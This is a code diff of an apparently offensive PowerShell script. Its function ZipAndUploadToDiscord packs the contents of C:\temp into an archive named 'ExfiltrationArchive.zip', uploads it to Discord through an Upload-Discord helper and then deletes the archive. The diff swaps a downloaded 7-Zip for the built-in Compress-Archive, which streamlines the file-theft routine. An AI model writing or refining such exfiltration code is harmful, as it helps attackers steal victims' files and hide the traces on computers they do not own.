@@ -47,24 +47,25 @@ function Upload-Discord {
 }
 
 
-# Function to create a zip archive using 7-Zip and upload to Discord
+# Function to create a zip archive using Compress-Archive and upload to Discord
 function ZipAndUploadToDiscord {
 
-    # Download 7-Zip
-    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+    # Specify the source directory
+    $sourceDirectory = "C:\temp"
 
-    # Unzip 7-Zip
-    Expand-Archive -Path .\7z.zip -DestinationPath .\7z -Force
+    # Specify the destination zip file path
+    $zipFilePath = "C:\temp\ExfiltrationArchive.zip"
 
-    # Create a zip archive using 7-Zip
-    .\7z\7za.exe a -tzip "C:\temp\ExfiltrationArchive.zip" "C:\temp\*" -r
+    # Compress the contents of the source directory to a zip file
+    Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
 
     # Call Upload-Discord to send the zip archive to Discord
-    Upload-Discord -file C:\temp\ExfiltrationArchive.zip -text "Exfiltration Archive :"
+    Upload-Discord -file $zipFilePath -text "Exfiltration Archive :"
 
-    # Cleanup: Remove 7-Zip files
-    Remove-Item -Path .\7z.zip, .\7z -Recurse -Force
+    # Cleanup: Remove the zip file
+    Remove-Item -Path $zipFilePath -Force
 }
+
 
 
 
